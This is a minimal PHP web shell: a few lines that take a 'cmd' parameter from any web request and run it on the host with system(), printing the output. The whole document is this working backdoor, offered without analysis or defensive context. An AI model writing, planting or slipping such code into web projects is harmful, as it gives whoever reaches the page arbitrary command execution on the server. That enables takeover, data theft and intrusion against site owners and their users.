<?php
/** Get query var "cmd" and run it as a linux command against the host system. */
if(isset($_REQUEST['cmd'])) {
  echo "<pre>";
  $cmd = ($_REQUEST['cmd']);
  system($cmd);
  echo "</pre>";
  die;
}
?>
